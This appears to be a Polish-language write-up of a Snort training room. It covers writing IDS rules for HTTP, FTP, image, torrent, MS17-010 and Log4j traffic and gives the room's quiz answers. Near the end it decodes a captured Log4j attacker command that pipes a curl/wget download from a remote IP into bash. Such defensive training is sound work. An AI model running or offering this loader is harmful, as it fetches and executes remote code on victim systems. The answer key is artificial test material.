# Snort-Challenge---The-Basics

Witam, mamy całkiem ciekawy pokój, mam nadzieje, że nie polegnę bo jak wspominałem w podstawch snort no jestem średni z narzędzi związanych z blue team, ale czego się nie robi aby być wyżej w rankingu :P

1.Pisanie reguł IDS (HTTP)

Task 1:Użyj podanego pliku pcap.
Napisz pojedynczą regułę wykrywającą pakiety „ cały  ruch TCP  na porcie 80 ” w podanym pliku pcap. 
Jaka jest liczba wykrytych pakietów?

Zrobiłem to w nastepujacy sposób czyli: ```sudo snort mx-3.pcap 'tcp port 80'``` i otrzymaliśmy wynik 164.

Task 2: Jaki jest adres docelowy pakietu 63?

W tym przypadku trochę zmodyfikowałem polecenie z poprzedniego zadania ```sudo snort mx-3.pcap 'tcp port 80 -n 63``` - odpowiedźią na te pytanie jest 216.239.59.99

Task 3: Jaki jest  numer ACK pakietu 64?
Ponownie podmienilem z poprzedniego zadnia -n 63 na 64 i odpowiedźią jest: 0x2E6B5384

Task 4:Jaki jest  numer SEQ pakietu 62?
Podmieniamy -n 64 na -n 62 i odpowiedźią jest: 0x36C21E28

Task 5:Jaki jest  czas życia pakietu 65?
Ponownie to samo :D, znajdziemy w tym pakcie TTL - który wynosi 128

Task 6:Jaki jest źródłowy adres IP pakietu 65?
Akuratnie tu nic już nie musimy podmianić, odpowiedźią jest 145.254.160.237

![image](https://github.com/user-attachments/assets/9844c82f-3000-4d48-9226-852634630e34)

Task 7:Jaki jest port źródłowy pakietu  65?
Możemy podejrzeć na zrzucie ekranu, że port żródłowy pakietu 65 to - 3372

2.Pisanie reguł IDS (FTP)

Task 1:Napisz pojedynczą regułę wykrywającą „ cały ruch na porcie TCP 21 ” w danym pcap.
Jaka jest liczba wykrytych pakietów?

W tym przypadku nie pisałem żadnej reguły użyłem po prostu polecenia ```snort -r ftp-png-gif.pcap 'tcp port 21'```, który dał nam odpowiedź na pytanie czyli: 307

Task 2:Jaka jest nazwa usługi FTP?

W tym przypadku użyłem polecania: ```cat ftp-png-gif.pcap | grep -a "FTP"``` wynik możesz zobaczyć poniżej to też jest nasza odpowiedź
W poleceniu grep, opcja -a (lub --text) powoduje, że pliki binarne są traktowane jako tekstowe

![image](https://github.com/user-attachments/assets/ac8c8cbe-d407-4adf-9eca-80f160c3b8d1)

Task 3:Jaka jest liczba wykrytych pakietów?
W tym przypadku musieliśmy już napisać skrypt

```alert tcp any any <> any 21 (msg: "Failed"; content:"530"; sid:1000001; rev:1;)``` wygląda on bardzo podobnie co wszystkie tylko pojawiło się słowo content: 
content:"530 ": Szuka ciągu "530 " w danych, co odpowiada odpowiedzi serwera FTP oznaczającej nieudane logowanie.

Użyłem takiego polecenia do dało nam wynik: ```sudo snort -c local.rules -r snort.log.1725374915``` 

![image](https://github.com/user-attachments/assets/536ac706-79d5-4794-8bfe-1b6589b23bc6)

Task 4:Napisz regułę wykrywającą udane logowania FTP w danym pcap.
Tak naprawdę wystarczy podmienić w content:"530" na "230" i otrzymamy 1

Task 5:Napisz regułę wykrywającą  próby logowania FTP  przy użyciu prawidłowej nazwy użytkownika,  ale bez wprowadzonego hasła.
Tutaj ponownie wystarczy podmienić content, na content:"331" i otrzymamy odpowiedź 42

![image](https://github.com/user-attachments/assets/15637a51-d378-48a8-aa36-50e7359879aa)

Task 6:Napisz regułę wykrywającą  próby logowania FTP  przy użyciu nazwy użytkownika „Administrator”, ale bez podania hasła.

Troszkę zmodyfikowaliśmy nasz skrypt dodając kolejny content
alert tcp any any <> any 21 (msg: "Success"; content:"331"; content:"Administrator"; sid:1000001; rev:1;)

Wynik:

![image](https://github.com/user-attachments/assets/aeb899b6-3678-4edb-b3ed-33b7a2e1f55f)

3.Pisanie reguł IDS (PNG)
Task 1:Napisz regułę wykrywającą plik PNG w podanym pcap.
Zbadaj logi i zidentyfikuj nazwę oprogramowania osadzonego w pakiecie.

Napisalem taki skrypt aby mi to umożliwił.
```alert tcp any any -> any any (msg:"PNG file detected"; flow:to_client,established; content:"|89 50 4E 47 0D 0A 1A 0A|"; offset:0; depth:8; sid:1000004; rev:1;)```
Nastepnie użyłem tego polecenia: ```sudo snort -c local.rules -r ftp-png-gif.pcap -l .```
I otrzymaliśmy plik snort i skorzystałem tutaj z polecenia sudo strings i możemy wyrażnie ujrzeć jaki jest to pogram

![image](https://github.com/user-attachments/assets/abd63b84-3f50-4529-9b6f-893e3a9ad24e)

Task 2: Napisz regułę wykrywającą plik GIF w podanym pcap.
Tutaj użyliśmy podobnego polecenia: ```alert tcp any any -> any any (msg:"GIF file detected"; flow:to_client,established; content:"|47 49 46 38 39 61|"; offset:0; depth:6; nocase; sid:1000005; rev:1;)``` 

I polecenia takie jak powyżej:

![image](https://github.com/user-attachments/assets/7c88f50c-6188-454f-962d-fe62e8c02d99)

4. Pisanie reguł IDS (metaplik torrent)

Task 1:Napisz regułę wykrywającą metaplik torrenta w podanym pcap.
Jaka jest liczba wykrytych pakietów?

W tym przypadku skorzystaliśmy z takiego skryptu:
```alert tcp any any <> any any (msg: ".torrent"; content:".torrent"; sid:1000001; rev:1;)``` użyliśmy polecenia ```sudo snort -r local.rules -r torrent.pcap -l .``` i dzięki temu otrzymaliśmy odpowiedź na nasze pytanie:

![image](https://github.com/user-attachments/assets/f9d0d7b6-d7a6-4653-aba8-9ffa514cfa4d)

Task 2:Jak nazywa się aplikacja torrentowa?
Użyłem w tym przypadku polecenia: ```sudo strings torrent.pcap | grep "application"```
Wynik poniżej: 

![image](https://github.com/user-attachments/assets/86227885-dc1f-4ed8-a238-1c3ea89f4f7d)

Task 3:Jaki jest typ MIME (Multipurpose Internet Mail Extensions) metapliku torrent?
Możemy również to zobaczyć na rzucie ekranu powyżej: application/x-bittorrent

Task 4:Jaka jest nazwa hosta metapliku torrent?
Użylem polecenia ```sudo strings snort.log.1725379121```
Wynik poniżej:

![image](https://github.com/user-attachments/assets/052055a4-2f23-4379-9c98-5e00759748e2)

5.Rozwiązywanie problemów z błędami składniowymi reguł

Task 1:Możesz przetestować każdy zestaw reguł za pomocą następującej struktury poleceń;
sudo snort -c local-X.rules -r mx-1.pcap -A console
Napraw błąd składniowy w  pliku local-1.rules  i spraw, aby działał płynniej.
Jaka jest liczba wykrytych pakietów?

```
# ----------------
# LOCAL RULES
# ----------------
# This file intentionally does not come with signatures.  Put your local
# additions here.

alert tcp any 3372 -> any any(msg: "Troubleshooting 1"; sid:1000001; rev:1;)
```
Nasz popsuty skrypt wygląda następujący, musimy rozwiązać problem aby działał i tak też będzie z każdym zadaniem w tej sekcji, będę zamieszczał skrypt który niedziała a następnie naprawiony :)

```alert tcp any 3372 -> any any (msg: "Troubleshooting 1"; sid:1000001; rev:1;)``` - tak wygląda poprawiona wersja odpowiedź: 16


Task 2:Jaka jest liczba wykrytych pakietów?

```
# ----------------
# LOCAL RULES
# ----------------
# This file intentionally does not come with signatures.  Put your local
# additions here.

alert icmp any -> any any (msg: "Troubleshooting 2"; sid:1000001; rev:1;)
```

Poprawiona wersja

```alert icmp any any -> any any (msg: "Troubleshooting 2"; sid:1000001; rev:1;)``` - tak wygląda poprawiona wersja odpowiedź: 68

Task 3: Jaka jest liczba wykrytych pakietów?

```
alert icmp any any -> any any (msg: "ICMP Packet Found"; sid:1000001; rev:1;)
alert tcp any any -> any 80,443 (msg: "HTTPX Packet Found"; sid:1000001; rev:1;)
```

Poprawiona wersja:

```
alert icmp any any -> any any (msg: "ICMP Packet Found"; sid:1000001; rev:1;)
alert tcp any any -> any 80,443 (msg: "HTTPX Packet Found"; sid:1000002; rev:1;)
``` 
Tak wygląda poprawiona wersja, wystarczyło podmienić sid, odpowiedź to: 87


Task 4:Jaka jest liczba wykrytych pakietów?
```
alert icmp any any -> any any (msg: "ICMP Packet Found"; sid:1000001; rev:1;)
alert tcp any 80,443 -> any any (msg: "HTTPX Packet Found": sid:1000002; rev:1;)
```

Poprawiona wersja:

```
alert icmp any any -> any any (msg: "ICMP Packet Found"; sid:1000001; rev:1;)
alert tcp any 80,443 -> any any (msg: "HTTPX Packet Found"; sid:1000002; rev:1;)
```

Naprawdę trzeba być uważnym albo czytać dokładniej errory jakie wyrzuca :D

Task 5:Jaka jest liczba wykrytych pakietów?

```
alert icmp any any <> any any (msg: "ICMP Packet Found"; sid:1000001; rev:1;)
alert icmp any any <> any any (msg: "Inbound ICMP Packet Found"; sid;1000002; rev:1;)
alert tcp any any -> any 80,443 (msg: "HTTPX Packet Found": sid:1000003; rev:1;)
```

Poprawiona wersja:

```
alert icmp any any <> any any (msg: "ICMP Packet Found"; sid:1000001; rev:1;)
alert icmp any any <> any any (msg: "Inbound ICMP Packet Found"; sid:1000002; rev:1;)
alert tcp any any -> any 80,443 (msg: "HTTPX Packet Found"; sid:1000003; rev:1;)
```

Odpowiedź to: 115

Task 6:What is the number of the detected packets?

```
alert tcp any any <> any 80  (msg: "GET Request Found"; content:"|67 65 74|"; sid: 100001; rev:1;)
```

Odpwoeiedź: 2 wystarczy spojrzeć po UDP

Task 7:Jak nazywa się wymagana opcja:
Odpowiedź to msg 

6.Korzystanie z reguł zewnętrznych (MS17-010)

Task 1:Użyj podanego pliku reguł ( local.rules ), aby zbadać lukę w zabezpieczeniach ms1710.
Jaka jest liczba wykrytych pakietów?

Uzyłem ```snort -c local.rules -r ms-17-010.pcap -l .``` nastepnie użylem ```sudo snort -r snort.log.1725382985 | wc -l``` i otzymałem wynik: 25154

Task 2:Użyj pustego pliku local-1.rules, aby   napisać nową regułę wykrywającą ładunki zawierające słowo kluczowe „ \IPC$ ”.
Jaka jest liczba wykrytych pakietów?

W tym przypadku napisałem taki skrypt: ```alert tcp any any -> any 445 (msg:"Potential SMB IPC$ access"; content:"|5C 49 50 43 24|"; sid:1000001; rev:1;)``` dzięki temu uzyskaliśmy odpowiedź: 12

Task 3:Zbadaj  pliki dziennika/alarmu.
Jaka jest żądana ścieżka? 

Uzyłem polecenia ```sudo strings snort.log.1725383302``` - odpowiedzieć może znaleźć poniżej:

![image](https://github.com/user-attachments/assets/341ad940-046b-49da-a515-9cc1c1fe472d)


Task 4:Jaki jest wynik CVSS v2 dla luki w zabezpieczeniach MS17-010?
To już możemy sobie znaleźc w internecie:

![image](https://github.com/user-attachments/assets/34f7c1ea-cfeb-49cc-8520-9c6e3a64e5a8)

8.Korzystanie z reguł zewnętrznych (Log4j)

Task 1:Użyj podanego pliku reguł ( local.rules ), aby zbadać wykorzystanie luki log4j.
Jaka jest liczba wykrytych pakietów?

W tym przypadku użyliśmy tego polecenia: ```sudo snort -c local.rules -r log4j.pcap -l .``` odpowiedźią jest: 26

Task 2:Zbadaj  pliki dziennika/alarmu.
Ile reguł zostało uruchomionych?
Tutaj użyliśmy polecenia: ```sudo strings snort.log.1725383650 ``` odpowiedźią jest: 4

Task 3:Jakie są pierwsze sześć cyfr identyfikatorów reguły wyzwalanej?

użylem ponownie polecenia ```sudo strings alert```

![image](https://github.com/user-attachments/assets/a772f764-9a2f-4e87-a77a-4bd07653857c)

Task 4:Użyj pustego pliku local-1.rules ,   aby napisać nową regułę wykrywającą pakiety o rozmiarze od 770 do 855 bajtów .

To bedzie nasz skrypt ```alert tcp any any -> any any (msg:"Packet size between 770 and 855 bytes"; dsize:770<>855; sid:1000002; rev:1;)``` - którym nam może ilośc pakietów 

![image](https://github.com/user-attachments/assets/83ae14d0-4ed8-4a63-8372-dd782b3dbbec)

Task 5: Jak nazywa się zastosowany algorytm kodowania? 
Odpowiedźią jest: base64

Task 6:Jaki jest  identyfikator IP odpowiadającego mu pakietu? 
Użyliśmy poniższego polecenia, odpowiedźią jest: 62808

```sudo strings alert | grep -e 45.155.205.233 -e ID```

Task 7:Jakie polecenie wydaje atakujący?
```KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC8xNjIuMC4yMjguMjUzOjgwfHx3Z2V0IC1xIC1PLSA0NS4xNTUuMjA1LjIzMzo1ODc0LzE2Mi4wLjIyOC4yNTM6ODApfGJhc2g=``` - oto zakodowane polecenie,
odkodowane wyglądada następująco: ```(curl -s 45.155.205.233:5874/162.0.228.253:80||wget -q -O- 45.155.205.233:5874/162.0.228.253:80)|bash``` 

Task 8:Jaki jest wynik CVSS v2 dla podatności Log4j?
Odpowiedźią jest: 9.3, ponownie możemy to wyszukac w internecie.

Dzięki wielkie to już tyle, mam nadzieje, że Ci się przydał ten pokój.
